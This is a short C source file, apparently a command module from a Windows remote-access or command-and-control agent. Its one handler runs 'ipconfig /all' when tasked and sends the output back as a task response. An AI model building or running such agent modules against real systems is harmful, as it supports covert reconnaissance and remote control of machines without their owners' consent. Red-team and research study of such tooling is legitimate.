#define _WIN32_WINNT 0x0600
#include "commands.h"
#include "utils.h"
#include <stdlib.h>

#ifdef INCLUDE_CMD_IFCONFIG

void command_ifconfig(char *task_id, char *params) {
  (void)params;
  char *output = execute_shell("ipconfig /all");
  send_task_response(task_id, output);
  if (output)
    free(output);
}

#endif
